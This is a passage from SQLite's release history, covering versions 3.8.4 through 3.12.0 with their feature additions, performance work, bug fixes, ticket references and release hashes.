Backport a simple query planner optimization that allows the IS operator to drive an index on a LEFT OUTER JOIN. No other changes from the version 3.9.2 baseline. 2016-03-29 (3.12.0) Potentially Disruptive Change: The SQLITE_DEFAULT_PAGE_SIZE is increased from 1024 to 4096. The SQLITE_DEFAULT_CACHE_SIZE is changed from 2000 to -2000 so the same amount of cache memory is used by default. See the application note on the version 3.12.0 page size change for further information. Performance enhancements: Enhancements to the Lemon parser generator so that it creates a smaller and faster SQL parser. Only create master journal files if two or more attached databases are all modified, do not have PRAGMA synchronous set to OFF, and do not have the journal_mode set to OFF, MEMORY, or WAL. Only create statement journal files when their size exceeds a threshold. Otherwise the journal is held in memory and no I/O occurs. The threshold can be configured at compile-time using SQLITE_STMTJRNL_SPILL or at start-time using sqlite3_config(SQLITE_CONFIG_STMTJRNL_SPILL). The query planner is able to optimize IN operators on virtual tables even if the xBestIndex method does not set the sqlite3_index_constraint_usage.omit flag of the virtual table column to the left of the IN operator. The query planner now does a better job of optimizing virtual table accesses in a 3-way or higher join where constraints on the virtual table are split across two or more other tables of the join. More efficient handling of application-defined SQL functions, especially in cases where the application defines hundreds or thousands of custom functions. The query planner considers the LIMIT clause when estimating the cost of ORDER BY. The configure script (on unix) automatically detects pread() and pwrite() and sets compile-time options to use those OS interfaces if they are available. Reduce the amount of memory needed to hold the schema. Other miscellaneous micro-optimizations for improved performance and reduced memory usage. New Features: Added the SQLITE_DBCONFIG_ENABLE_FTS3_TOKENIZER option to sqlite3_db_config() which allows the two-argument version of the fts3_tokenizer() SQL function to be enabled or disabled at run-time. Added the sqlite3rbu_bp_progress() interface to the RBU extension. The PRAGMA defer_foreign_keys=ON statement now also disables RESTRICT actions on foreign key. Added the sqlite3_system_errno() interface. Added the SQLITE_DEFAULT_SYNCHRONOUS and SQLITE_DEFAULT_WAL_SYNCHRONOUS compile-time options. The SQLITE_DEFAULT_SYNCHRONOUS compile-time option replaces the SQLITE_EXTRA_DURABLE option, which is no longer supported. Enhanced the \".stats\" command in the command-line shell to show more information about I/O performance obtained from /proc, when available. Bug fixes: Make sure the sqlite3_set_auxdata() values from multiple triggers within a single statement do not interfere with one another. Ticket dc9b1c91. Fix the code generator for expressions of the form \"x IN (SELECT...)\" where the SELECT statement on the RHS is a correlated subquery. Ticket 5e3c886796e5512e. Fix a harmless TSAN warning associated with the sqlite3_db_readonly() interface. Hashes: SQLITE_SOURCE_ID: \"2016-03-29 10:14:15 e9bb4cf40f4971974a74468ef922bdee481c988b\" SHA1 for sqlite3.c: cba2be96d27cb51978cd4a200397a4ad178986eb 2016-03-03 (3.11.1) Improvements to the Makefiles and build scripts used by VisualStudio. Fix an FTS5 issue in which the 'optimize' command could cause index corruption. Fix a buffer overread that might occur if FTS5 is used to query a corrupt database file. Increase the maximum \"scope\" value for the spellfix1 extension from 6 to 30. SQLITE_SOURCE_ID: \"2016-03-03 16:17:53 f047920ce16971e573bc6ec9a48b118c9de2b3a7\" SHA1 for sqlite3.c: 3da832fd2af36eaedb05d61a8f4c2bb9f3d54265 2016-02-15 (3.11.0) General improvements: Enhanced WAL mode so that it works efficiently with transactions that are larger than the cache_size. Added the FTS5 detail option. Added the \"EXTRA\" option to PRAGMA synchronous that does a sync of the containing directory when a rollback journal is unlinked in DELETE mode, for better durability. The SQLITE_EXTRA_DURABLE compile-time option enables PRAGMA synchronous=EXTRA by default. Enhanced the query planner so that it is able to use a covering index as part of the OR optimization. Avoid recomputing NOT NULL and CHECK constraints on unchanged columns in UPDATE statement. Many micro-optimizations, resulting in a library that is faster than the previous release. Enhancements to the command-line shell: By default, the shell is now in \"auto-explain\" mode. The output of EXPLAIN commands is automatically formatted. Added the \".vfslist\" dot-command. The SQLITE_ENABLE_EXPLAIN_COMMENTS compile-time option is now turned on by default in the standard builds. Enhancements to the TCL Interface: If a database connection is opened with the \"-uri 1\" option, then URI filenames are honored by the \"backup\" and \"restore\" commands. Added the \"-sourceid\" option to the \"sqlite3\" command. Makefile improvements: Improved pthreads detection in configure scripts. Add the ability to do MSVC Windows builds from the amalgamation tarball. Bug fixes Fix an issue with incorrect sharing of VDBE temporary registers between co-routines that could cause incorrect query results in obscure cases. Ticket d06a25c84454a. Fix a problem in the sqlite3_result_subtype() interface that could cause problems for the json1 extension under obscure circumstances. Fix for ticket f45ac567eaa9f9. Escape control characters in JSON strings. Fix for ticket ad2559db380abf8. Reenable the xCurrentTime and xGetLastError methods in the built-in unix VFSes as long as SQLITE_OMIT_DEPRECATED is not defined. Backwards Compatibility: Because of continuing security concerns, the two-argument version of of the seldom-used and little-known fts3_tokenizer() function is disabled unless SQLite is compiled with the SQLITE_ENABLE_FTS3_TOKENIZER. Hashes: SQLITE_SOURCE_ID: \"2016-02-15 17:29:24 3d862f207e3adc00f78066799ac5a8c282430a5f\" SHA1 for sqlite3.c: df01436c5fcfe72d1a95bc172158219796e1a90b 2016-01-20 (3.10.2) Critical bug fix: Version 3.10.0 introduced a case-folding bug in the LIKE operator which is fixed by this patch release. Ticket 80369eddd5c94. Other miscellaneous bug fixes: Fix a use-after-free that can occur when SQLite is compiled with -DSQLITE_HAS_CODEC. Fix the build so that it works with -DSQLITE_OMIT_WAL. Fix the configure script for the amalgamation so that the --readline option works again on Raspberry PIs. Hashes: SQLITE_SOURCE_ID: \"2016-01-20 15:27:19 17efb4209f97fb4971656086b138599a91a75ff9\" SHA1 for sqlite3.c: f7088b19d97cd7a1c805ee95c696abd54f01de4f 2016-01-14 (3.10.1) New feature: Add the SQLITE_FCNTL_JOURNAL_POINTER file control. Bug fix: Fix a 16-month-old bug in the query planner that could generate incorrect results when a scalar subquery attempts to use the block sorting optimization. Ticket cb3aa0641d9a4. Hashes: SQLITE_SOURCE_ID: \"2016-01-13 21:41:56 254419c36766225ca542ae873ed38255e3fb8588\" SHA1 for sqlite3.c: 1398ba8e4043550a533cdd0834bfdad1c9eab0f4 2016-01-06 (3.10.0) General improvements: Added support for LIKE, GLOB, and REGEXP operators on virtual tables. Added the colUsed field to sqlite3_index_info for use by the sqlite3_module.xBestIndex method. Enhance the PRAGMA cache_spill statement to accept a 32-bit integer parameter which is the threshold below which cache spilling is prohibited. On unix, if a symlink to a database file is opened, then the corresponding journal files are based on the actual filename, not the symlink name. Added the \"--transaction\" option to sqldiff. Added the sqlite3_db_cacheflush() interface. Added the sqlite3_strlike() interface. When using memory-mapped I/O map the database file read-only so that stray pointers and/or array overruns in the application cannot accidentally modify the database file. Added the experimental sqlite3_snapshot_get(), sqlite3_snapshot_open(), and sqlite3_snapshot_free() interfaces. These are subject to change or removal in a subsequent release. Enhance the 'utc' modifier in the date and time functions so that it is a no-op if the date/time is known to already be in UTC. (This is not a compatibility break since the behavior has long been documented as \"undefined\" in that case.) Added the json_group_array() and json_group_object() SQL functions in the json extension. Added the SQLITE_LIKE_DOESNT_MATCH_BLOBS compile-time option. Many small performance optimizations. Portability enhancements: Work around a sign-extension bug in the optimizer of the HP C compiler on HP/UX. (details) Enhancements to the command-line shell: Added the \".changes ON|OFF\" and \".vfsinfo\" dot-commands. Translate between MBCS and UTF8 when running in cmd.exe on Windows. Enhancements to makefiles: Added the --enable-editline and --enable-static-shell options to the various autoconf-generated configure scripts. Omit all use of \"awk\" in the makefiles, to make building easier for MSVC users. Important fixes: Fix inconsistent integer to floating-point comparison operations that could result in a corrupt index if the index is created on a table column that contains both large integers and floating point values of similar magnitude. Ticket 38a97a87a6. Fix an infinite-loop in the query planner that could occur on malformed common table expressions. Various bug fixes in the sqldiff tool. Hashes: SQLITE_SOURCE_ID: \"2016-01-06 11:01:07 fd0a50f0797d154fefff724624f00548b5320566\" SHA1 for sqlite3.c: b92ca988ebb6df02ac0c8f866dbf3256740408ac 2015-11-02 (3.9.2) Fix the schema parser so that it interprets certain (obscure and ill-formed) CREATE TABLE statements the same as legacy. Fix for ticket ac661962a2aeab3c331 Fix a query planner problem that could result in an incorrect answer due to the use of automatic indexing in subqueries in the FROM clause of a correlated scalar subqueries. Fix for ticket 8a2adec1. SQLITE_SOURCE_ID: \"2015-11-02 18:31:45 bda77dda9697c463c3d0704014d51627fceee328\" SHA1 for sqlite3.c: 1c4013876f50bbaa3e6f0f98e0147c76287684c1 2015-10-16 (3.9.1) Fix the json1 extension so that it does not recognize ASCII form-feed as a whitespace character, in order to comply with RFC-7159. Fix for ticket 57eec374ae1d0a1d Add a few #ifdef and build script changes to address compilation issues that appeared after the 3.9.0 release. SQLITE_SOURCE_ID: \"\"2015-10-16 17:31:12 767c1727fec4ce11b83f25b3f1bfcfe68a2c8b02\" SHA1 for sqlite3.c: 5e6d1873a32d82c2cf8581f143649940cac8ae49 2015-10-14 (3.9.0) Policy Changes: The version numbering conventions for SQLite are revised to use the emerging standard of semantic versioning. New Features And Enhancements: Added the json1 extension module in the source tree, and in the amalgamation. Enable support using the SQLITE_ENABLE_JSON1 compile-time option. Added Full Text Search version 5 (FTS5) to the amalgamation, enabled using SQLITE_ENABLE_FTS5. FTS5 will be considered \"experimental\" (subject to incompatible changes) for at least one more release cycle. The CREATE VIEW statement now accepts an optional list of column names following the view name. Added support for indexes on expressions. Added support for table-valued functions in the FROM clause of a SELECT statement. Added support for eponymous virtual tables. A VIEW may now reference undefined tables and functions when initially created. Missing tables and functions are reported when the VIEW is used in a query. Added the sqlite3_value_subtype() and sqlite3_result_subtype() interfaced (used by the json1 extension). The query planner is now able to use partial indexes that contain AND-connected terms in the WHERE clause. The sqlite3_analyzer.exe utility is updated to report the depth of each btree and to show the average fanout for indexes and WITHOUT ROWID tables. Enhanced the dbstat virtual table so that it can be used as a table-valued function where the argument is the schema to be analyzed. Other changes: The sqlite3_memory_alarm() interface, which has been deprecated and undocumented for 8 years, is changed into a no-op. Important fixes: Fixed a critical bug in the SQLite Encryption Extension that could cause the database to become unreadable and unrecoverable if a VACUUM command changed the size of the encryption nonce. Added a memory barrier in the implementation of sqlite3_initialize() to help ensure that it is thread-safe. Fix the OR optimization so that it always ignores subplans that do not use an index. Do not apply the WHERE-clause pushdown optimization on terms that originate in the ON or USING clause of a LEFT JOIN. Fix for ticket c2a19d81652f40568c. SQLITE_SOURCE_ID: \"2015-10-14 12:29:53 a721fc0d89495518fe5612e2e3bbc60befd2e90d\" SHA1 for sqlite3.c: c03e47e152ddb9c342b84ffb39448bf4a2bd4288 2015-07-29 (3.8.11.1) Restore an undocumented side-effect of PRAGMA cache_size: force the database schema to be parsed if the database has not been previously accessed. Fix a long-standing problem in sqlite3_changes() for WITHOUT ROWID tables that was reported a few hours after the 3.8.11 release. SQLITE_SOURCE_ID: \"2015-07-29 20:00:57 cf538e2783e468bbc25e7cb2a9ee64d3e0e80b2f\" SHA1 for sqlite3.c: 3be71d99121fe5b17f057011025bcf84e7cc6c84 2015-07-27 (3.8.11) Added the experimental RBU extension. Note that this extension is experimental and subject to change in incompatible ways. Added the experimental FTS5 extension. Note that this extension is experimental and subject to change in incompatible ways. Added the sqlite3_value_dup() and sqlite3_value_free() interfaces. Enhance the spellfix1 extension to support ON CONFLICT clauses. The IS operator is now able to drive indexes. Enhance the query planner to permit automatic indexing on FROM-clause subqueries that are implemented by co-routine. Disallow the use of \"rowid\" in common table expressions. Added the PRAGMA cell_size_check command for better and earlier detection of database file corruption. Added the matchinfo 'b' flag to the matchinfo() function in FTS3. Improved fuzz-testing of database files, with fixes for problems found. Add the fuzzcheck test program and automatically run this program using both SQL and database test cases on \"make test\". Added the SQLITE_MUTEX_STATIC_VFS1 static mutex and use it in the Windows VFS. The sqlite3_profile() callback is invoked (by sqlite3_reset() or sqlite3_finalize()) for statements that did not run to completion. Enhance the page cache so that it can preallocate a block of memory to use for the initial set page cache lines. Set the default preallocation to 100 pages. Yields about a 5% performance increase on common workloads. Miscellaneous micro-optimizations result in 22.3% more work for the same number of CPU cycles relative to the previous release. SQLite now runs twice as fast as version 3.8.0 and three times as fast as version 3.3.9. (Measured using cachegrind on the speedtest1.c workload on Ubuntu 14.04 x64 with gcc 4.8.2 and -Os. Your performance may vary.) Added the sqlite3_result_zeroblob64() and sqlite3_bind_zeroblob64() interfaces. Important bug fixes: Fix CREATE TABLE AS so that columns of type TEXT never end up holding an INT value. Ticket f2ad7de056ab1dc9200 Fix CREATE TABLE AS so that it does not leave NULL entries in the sqlite_master table if the SELECT statement on the right-hand side aborts with an error. Ticket 873cae2b6e25b Fix the skip-scan optimization so that it works correctly when the OR optimization is used on WITHOUT ROWID tables. Ticket 8fd39115d8f46 Fix the sqlite3_memory_used() and sqlite3_memory_highwater() interfaces so that they actually do provide a 64-bit answer. Hashes: SQLITE_SOURCE_ID: \"2015-07-27 13:49:41 b8e92227a469de677a66da62e4361f099c0b79d0\" SHA1 for sqlite3.c: 719f6891abcd9c459b5460b191d731cd12a3643e 2015-05-20 (3.8.10.2) Fix an index corruption issue introduced by version 3.8.7. An index with a TEXT key can be corrupted by an INSERT into the corresponding table if the table has two nested triggers that convert the key value to INTEGER and back to TEXT again. Ticket 34cd55d68e0 SQLITE_SOURCE_ID: \"2015-05-20 18:17:19 2ef4f3a5b1d1d0c4338f8243d40a2452cc1f7fe4\" SHA1 for sqlite3.c: 638abb77965332c956dbbd2c8e4248e84da4eb63 2015-05-09 (3.8.10.1) Make sqlite3_compileoption_used() responsive to the SQLITE_ENABLE_DBSTAT_VTAB compile-time option. Fix a harmless warning in the command-line shell on some versions of MSVC. Fix minor issues with the dbstat virtual table. SQLITE_SOURCE_ID: \"2015-05-09 12:14:55 05b4b1f2a937c06c90db70c09890038f6c98ec40\" SHA1 for sqlite3.c: 85e4e1c08c7df28ef61bb9759a0d466e0eefbaa2 2015-05-07 (3.8.10) Added the sqldiff.exe utility program for computing the differences between two SQLite database files. Added the matchinfo y flag to the matchinfo() function of FTS3. Performance improvements for ORDER BY, VACUUM, CREATE INDEX, PRAGMA integrity_check, and PRAGMA quick_check. Fix many obscure problems discovered while SQL fuzzing. Identify all methods for important objects in the interface documentation. (example) Made the American Fuzzy Lop fuzzer a standard part of SQLite's testing strategy. Add the \".binary\" and \".limits\" commands to the command-line shell. Make the dbstat virtual table part of standard builds when compiled with the SQLITE_ENABLE_DBSTAT_VTAB option. SQLITE_SOURCE_ID: \"2015-05-07 11:53:08 cf975957b9ae671f34bb65f049acf351e650d437\" SHA1 for sqlite3.c: 0b34f0de356a3f21b9dfc761f3b7821b6353c570 2015-04-08 (3.8.9) Add VxWorks-7 as an officially supported and tested platform. Added the sqlite3_status64() interface. Fix memory size tracking so that it works even if SQLite uses more than 2GiB of memory. Added the PRAGMA index_xinfo command. Fix a potential 32-bit integer overflow problem in the sqlite3_blob_read() and sqlite3_blob_write() interfaces. Ensure that prepared statements automatically reset on extended error codes of SQLITE_BUSY and SQLITE_LOCKED even when compiled using SQLITE_OMIT_AUTORESET. Correct miscounts in the sqlite3_analyzer.exe utility related to WITHOUT ROWID tables. Added the \".dbinfo\" command to the command-line shell. Improve the performance of fts3/4 queries that use the OR operator and at least one auxiliary fts function. Fix a bug in the fts3 snippet() function causing it to omit leading separator characters from snippets that begin with the first token in a column. SQLITE_SOURCE_ID: \"2015-04-08 12:16:33 8a8ffc862e96f57aa698f93de10dee28e69f6e09\" SHA1 for sqlite3.c: 49f1c3ae347e1327b5aaa6c7f76126bdf09c6f42 2015-02-25 (3.8.8.3) Fix a bug (ticket 2326c258d02ead33) that can lead to incorrect results if the qualifying constraint of a partial index appears in the ON clause of a LEFT JOIN. Added the ability to link against the \"linenoise\" command-line editing library in unix builds of the command-line shell. SQLITE_SOURCE_ID: \"2015-02-25 13:29:11 9d6c1880fb75660bbabd693175579529785f8a6b\" SHA1 for sqlite3.c: 74ee38c8c6fd175ec85a47276dfcefe8a262827a 2015-01-30 (3.8.8.2) Enhance sqlite3_wal_checkpoint_v2(TRUNCATE) interface so that it truncates the WAL file even if there is no checkpoint work to be done. SQLITE_SOURCE_ID: \"2015-01-30 14:30:45 7757fc721220e136620a89c9d28247f28bbbc098\" SHA1 for sqlite3.c: 85ce79948116aa9a087ec345c9d2ce2c1d3cd8af 2015-01-20 (3.8.8.1) Fix a bug in the sorting logic, present since version 3.8.4, that can cause output to appear in the wrong order on queries that contains an ORDER BY clause, a LIMIT clause, and that have approximately 60 or more columns in the result set. Ticket f97c4637102a3ae72b79. SQLITE_SOURCE_ID: \"2015-01-20 16:51:25 f73337e3e289915a76ca96e7a05a1a8d4e890d55\" SHA1 for sqlite3.c: 33987fb50dcc09f1429a653d6b47672f5a96f19e 2015-01-16 (3.8.8) New Features: Added the PRAGMA data_version command that can be used to determine if a database file has been modified by another process. Added the SQLITE_CHECKPOINT_TRUNCATE option to the sqlite3_wal_checkpoint_v2() interface, with corresponding enhancements to PRAGMA wal_checkpoint. Added the sqlite3_stmt_scanstatus() interface, available only when compiled with SQLITE_ENABLE_STMT_SCANSTATUS. The sqlite3_table_column_metadata() is enhanced to work correctly on WITHOUT ROWID tables and to check for the existence of a a table if the column name parameter is NULL. The interface is now also included in the build by default, without requiring the SQLITE_ENABLE_COLUMN_METADATA compile-time option. Added the SQLITE_ENABLE_API_ARMOR compile-time option. Added the SQLITE_REVERSE_UNORDERED_SELECTS compile-time option. Added the SQLITE_SORTER_PMASZ compile-time option and SQLITE_CONFIG_PMASZ start-time option. Added the SQLITE_CONFIG_PCACHE_HDRSZ option to sqlite3_config() which makes it easier for applications to determine the appropriate amount of memory for use with SQLITE_CONFIG_PAGECACHE. The number of rows in a VALUES clause is no longer limited by SQLITE_LIMIT_COMPOUND_SELECT. Added the eval.c loadable extension that implements an eval() SQL function that will recursively evaluate SQL. Performance Enhancements: Reduce the number of memcpy() operations involved in balancing a b-tree, for 3.2% overall performance boost. Improvements to cost estimates for the skip-scan optimization. The automatic indexing optimization is now capable of generating a partial index if that is appropriate. Bug fixes: Ensure durability following a power loss with \"PRAGMA journal_mode=TRUNCATE\" by calling fsync() right after truncating the journal file. The query planner now recognizes that any column in the right-hand table of a LEFT JOIN can be NULL, even if that column has a NOT NULL constraint. Avoid trying to optimize out NULL tests in those cases. Fix for ticket 6f2222d550f5b0ee7ed. Make sure ORDER BY puts rows in ascending order even if the DISTINCT operator is implemented using a descending index. Fix for ticket c5ea805691bfc4204b1cb9e. Fix data races that might occur under stress when running with many threads in shared cache mode where some of the threads are opening and closing connections. Fix obscure crash bugs found by american fuzzy lop. Ticket a59ae93ee990a55. Work around a GCC optimizer bug (for gcc 4.2.1 on MacOS 10.7) that caused the R-Tree extension to compute incorrect results when compiled with -O3. Other changes: Disable the use of the strchrnul() C-library routine unless it is specifically enabled using the -DHAVE_STRCHRNULL compile-time option. Improvements to the effectiveness and accuracy of the likelihood(), likely(), and unlikely() SQL hint functions. SQLITE_SOURCE_ID: \"2015-01-16 12:08:06 7d68a42face3ab14ed88407d4331872f5b243fdf\" SHA1 for sqlite3.c: 91aea4cc722371d58aae3d22e94d2a4165276905 2014-12-09 (3.8.7.4) Bug fix: Add in a mutex that was omitted from the previous release. SQLITE_SOURCE_ID: \"2014-12-09 01:34:36 f66f7a17b78ba617acde90fc810107f34f1a1f2e\" SHA1 for sqlite3.c: 0a56693a3c24aa3217098afab1b6fecccdedfd23 2014-12-05 (3.8.7.3) Bug fix: Ensure the cached KeyInfo objects (an internal abstraction not visible to the application) do not go stale when operating in shared cache mode and frequently closing and reopening some database connections while leaving other database connections on the same shared cache open continuously. Ticket e4a18565a36884b00edf. Bug fix: Recognize that any column in the right-hand table of a LEFT JOIN can be NULL even if the column has a NOT NULL constraint. Do not apply optimizations that assume the column is never NULL. Ticket 6f2222d550f5b0ee7ed. SQLITE_SOURCE_ID: \"2014-12-05 22:29:24 647e77e853e81a5effeb4c33477910400a67ba86\" SHA1 for sqlite3.c: 3ad2f5ba3a4a3e3e51a1dac9fda9224b359f0261 2014-11-18 (3.8.7.2) Enhance the ROLLBACK command so that pending queries are allowed to continue as long as the schema is unchanged. Formerly, a ROLLBACK would cause all pending queries to fail with an SQLITE_ABORT or SQLITE_ABORT_ROLLBACK error. That error is still returned if the ROLLBACK modifies the schema. Bug fix: Make sure that NULL results from OP_Column are fully and completely NULL and do not have the MEM_Ephem bit set. Ticket 094d39a4c95ee4. Bug fix: The %c format in sqlite3_mprintf() is able to handle precisions greater than 70. Bug fix: Do not automatically remove the DISTINCT keyword from a SELECT that forms the right-hand side of an IN operator since it is necessary if the SELECT also contains a LIMIT. Ticket db87229497. SQLITE_SOURCE_ID: \"2014-11-18 20:57:56 2ab564bf9655b7c7b97ab85cafc8a48329b27f93\" SHA1 for sqlite3.c: b2a68d5783f48dba6a8cb50d8bf69b238c5ec53a 2014-10-29 (3.8.7.1) In PRAGMA journal_mode=TRUNCATE mode, call fsync() immediately after truncating the journal file to ensure that the transaction is durable across a power loss. Fix an assertion fault that can occur when updating the NULL value of a field at the end of a table that was added using ALTER TABLE ADD COLUMN. Do not attempt to use the strchrnul() function from the standard C library unless the HAVE_STRCHRNULL compile-time option is set. Fix a couple of problems associated with running an UPDATE or DELETE on a VIEW with a rowid in the WHERE clause. SQLITE_SOURCE_ID: \"2014-10-29 13:59:56 3b7b72c4685aa5cf5e675c2c47ebec10d9704221\" SHA1 for sqlite3.c: 2d25bd1a73dc40f538f3a81c28e6efa5999bdf0c 2014-10-17 (3.8.7) Performance Enhancements: Many micro-optimizations result in 20.3% more work for the same number of CPU cycles relative to the previous release. The cumulative performance increase since version 3.8.0 is 61%. (Measured using cachegrind on the speedtest1.c workload on Ubuntu 13.10 x64 with gcc 4.8.1 and -Os. Your performance may vary.) The sorter can use auxiliary helper threads to increase real-time response. This feature is off by default and may be enabled using the PRAGMA threads command or the SQLITE_DEFAULT_WORKER_THREADS compile-time option. Enhance the skip-scan optimization so that it is able to skip index terms that occur in the middle of the index, not just as the left-hand side of the index. Improved optimization of CAST operators. Various improvements in how the query planner uses sqlite_stat4 information to estimate plan costs. New Features: Added new interfaces with 64-bit length parameters: sqlite3_malloc64(), sqlite3_realloc64(), sqlite3_bind_blob64(), sqlite3_result_blob64(), sqlite3_bind_text64(), and sqlite3_result_text64(). Added the new interface sqlite3_msize() that returns the size of a memory allocation obtained from sqlite3_malloc64() and its variants. Added the SQLITE_LIMIT_WORKER_THREADS option to sqlite3_limit() and PRAGMA threads command for configuring the number of available worker threads. The spellfix1 extension allows the application to optionally specify the rowid for each INSERT. Added the User Authentication extension. Bug Fixes: Fix a bug in the partial index implementation that might result in an incorrect answer if a partial index is used in a subquery or in a view. Ticket 98d973b8f5. Fix a query planner bug that might cause a table to be scanned in the wrong direction (thus reversing the order of output) when a DESC index is used to implement the ORDER BY clause on a query that has an identical GROUP BY clause. Ticket ba7cbfaedc7e6. Fix a bug in sqlite3_trace() that was causing it to sometimes fail to print an SQL statement if that statement needed to be re-prepared. Ticket 11d5aa455e0d98f3c1e6a08 Fix a faulty assert() statement. Ticket 369d57fb8e5ccdff06f1 Test, Debug, and Analysis Changes: Show ASCII-art abstract syntax tree diagrams using the \".selecttrace\" and \".wheretrace\" commands in the command-line shell when compiled with SQLITE_DEBUG, SQLITE_ENABLE_SELECTTRACE, and SQLITE_ENABLE_WHERETRACE. Also provide the sqlite3TreeViewExpr() and sqlite3TreeViewSelect() entry points that can be invoked from with the debugger to show the parse tree when stopped at a breakpoint. Drop support for SQLITE_ENABLE_TREE_EXPLAIN. The SELECTTRACE mechanism provides more useful diagnostics information. New options to the command-line shell for configuring auxiliary memory usage: --pagecache, --lookaside, and --scratch. SQLITE_SOURCE_ID: \"2014-10-17 11:24:17 e4ab094f8afce0817f4074e823fabe59fc29ebb4\" SHA1 for sqlite3.c: 56dcf5e931a9e1fa12fc2d600cd91d3bf9b639cd 2014-08-15 (3.8.6) Added support for hexadecimal integer literals in the SQL parser. (Ex: 0x123abc) Enhanced the PRAGMA integrity_check command to detect UNIQUE and NOT NULL constraint violations. Increase the maximum value of SQLITE_MAX_ATTACHED from 62 to 125. Increase the timeout in WAL mode before issuing an SQLITE_PROTOCOL error from 1 second to 10 seconds. Added the likely(X) SQL function. The unicode61 tokenizer is now included in FTS4 by default. Trigger automatic reprepares on all prepared statements when ANALYZE is run. Added a new loadable extension source code file to the source tree: fileio.c Add extension functions readfile(X) and writefile(X,Y) (using code copy/pasted from fileio.c in the previous bullet) to the command-line shell. Added the .fullschema dot-command to the command-line shell. Performance Enhancements: Deactivate the DISTINCT keyword on subqueries on the right-hand side of the IN operator. Add the capability of evaluating an IN operator as a sequence of comparisons as an alternative to using a table lookup. Use the sequence of comparisons implementation in circumstances where it is likely to be faster, such as when the right-hand side of the IN operator is small and/or changes frequently. The query planner now uses sqlite_stat4 information (created by ANALYZE) to help determine if the skip-scan optimization is appropriate. Ensure that the query planner never tries to use a self-made transient index in place of a schema-defined index. Other minor tweaks to improve the quality of VDBE code. Bug Fixes: Fix a bug in CREATE UNIQUE INDEX, introduced when WITHOUT ROWID support added in version 3.8.2, that allows a non-unique NOT NULL column to be given a UNIQUE index. Ticket 9a6daf340df99ba93c Fix a bug in R-Tree extension, introduced in the previous release, that can cause an incorrect results for queries that use the rowid of the R-Tree on the left-hand side of an IN operator. Ticket d2889096e7bdeac6. Fix the sqlite3_stmt_busy() interface so that it gives the correct answer for ROLLBACK statements that have been stepped but never reset. Fix a bug in that would cause a null pointer to be dereferenced if a column with a DEFAULT that is an aggregate function tried to usee its DEFAULT. Ticket 3a88d85f36704eebe1 CSV output from the command-line shell now always uses CRNL for the row separator and avoids inserting CR in front of NLs contained in data. Fix a column affinity problem with the IN operator. Ticket 9a8b09f8e6. Fix the ANALYZE command so that it adds correct samples for WITHOUT ROWID tables in the sqlite_stat4 table. Ticket b2fa5424e6fcb15. SQLITE_SOURCE_ID: \"2014-08-15 11:46:33 9491ba7d738528f168657adb43a198238abde19e\" SHA1 for sqlite3.c: 72c64f05cd9babb9c0f9b3c82536d83be7804b1c 2014-06-04 (3.8.5) Added support for partial sorting by index. Enhance the query planner so that it always prefers an index that uses a superset of WHERE clause terms relative to some other index. Improvements to the automerge command of FTS4 to better control the index size for a full-text index that is subject to a large number of updates. Added the sqlite3_rtree_query_callback() interface to R-Tree extension Added new URI query parameters \"nolock\" and \"immutable\". Use less memory by not remembering CHECK constraints on read-only database connections. Enable the OR optimization for WITHOUT ROWID tables. Render expressions of the form \"x IN (?)\" (with a single value in the list on the right-hand side of the IN operator) as if they where \"x==?\", Similarly optimize \"x NOT IN (?)\" Add the \".system\" and \".once\" commands to the command-line shell. Added the SQLITE_IOCAP_IMMUTABLE bit to the set of bits that can be returned by the xDeviceCharacteristics method of a VFS. Added the SQLITE_TESTCTRL_BYTEORDER test control. Bug Fixes: OFFSET clause ignored on queries without a FROM clause. Ticket 07d6a0453d Assertion fault on queries involving expressions of the form \"x IN (?)\". Ticket e39d032577. Incorrect column datatype reported. Ticket a8a0d2996a Duplicate row returned on a query against a table with more than 16 indices, each on a separate column, and all used via OR-connected constraints. Ticket 10fb063b11 Partial index causes assertion fault on UPDATE OR REPLACE. Ticket 2ea3e9fe63 Crash when calling undocumented SQL function sqlite_rename_parent() with NULL parameters. Ticket 264b970c43 ORDER BY ignored if the query has an identical GROUP BY. Ticket b75a9ca6b0 The group_concat(x,'') SQL function returns NULL instead of an empty string when all inputs are empty strings. Ticket 55746f9e65 Fix a bug in the VDBE code generator that caused crashes when doing an INSERT INTO ... SELECT statement where the number of columns being inserted is larger than the number of columns in the destination table. Ticket e9654505cfd Fix a problem in CSV import in the command-line shell where if the leftmost field of the first row in the CSV file was both zero bytes in size and unquoted no data would be imported. Fix a problem in FTS4 where the left-most column that contained the notindexed column name as a prefix was not indexed rather than the column whose name matched exactly. Fix the sqlite3_db_readonly() interface so that it returns true if the database is read-only due to the file format write version number being too large. SQLITE_SOURCE_ID: \"2014-06-04 14:06:34 b1ed4f2a34ba66c29b130f8d13e9092758019212\" SHA1 for sqlite3.c: 7bc194957238c61b1a47f301270286be5bc5208c 2014-04-03 (3.8.4.3) Add a one-character fix for a problem that might cause incorrect query results on a query that mixes DISTINCT, GROUP BY in a subquery, and ORDER BY. Ticket 98825a79ce14. SQLITE_SOURCE_ID: \"2014-04-03 16:53:12 a611fa96c4a848614efe899130359c9f6fb889c3\" SHA1 for sqlite3.c: 310a1faeb9332a3cd8d1f53b4a2e055abf537bdc 2014-03-26 (3.8.4.2) Fix a potential buffer overread that could result when trying to search a corrupt database file. SQLITE_SOURCE_ID: \"2014-03-26 18:51:19 02ea166372bdb2ef9d8dfbb05e78a97609673a8e\" SHA1 for sqlite3.c: 4685ca86c2ea0649ed9f59a500013e90b3fe6d03 2014-03-11 (3.8.4.1) Work around a C-preprocessor macro conflict that breaks the build for some configurations with Microsoft Visual Studio. When computing the cost of the skip-scan optimization, take into account the fact that multiple seeks are required. SQLITE_SOURCE_ID: \"2014-03-11 15:27:36 018d317b1257ce68a92908b05c9c7cf1494050d0\" SHA1 for sqlite3.c: d5cd1535053a50aa8633725e3595740b33709ac5 2014-03-10 (3.8.4) Code optimization and refactoring for improved performance. Add the \".clone\" and \".save\" commands to the command-line shell. Update the banner on the command-line shell to alert novice users when they are using an ephemeral in-memory database. Fix editline support in the command-line shell. Add support for coverage testing of VDBE programs using the SQLITE_TESTCTRL_VDBE_COVERAGE verb of sqlite3_test_control(). Update the _FILE_OFFSET_BITS macro so that builds work again on QNX. Change the datatype of SrcList.nSrc from type u8 to type int to work around an issue in the C compiler on AIX. Get extension loading working on Cygwin. Bug fix: Fix the char() SQL function so that it returns an empty string rather than an \"out of memory\" error when called with zero arguments. Bug fix: DISTINCT now recognizes that a zeroblob and a blob of all 0x00 bytes are the same thing. Ticket [fccbde530a] Bug fix: Compute the correct answer for queries that contain an IS NOT NULL term in the WHERE clause and also contain an OR term in the WHERE clause and are compiled with SQLITE_ENABLE_STAT4. Ticket [4c86b126f2] Bug fix: 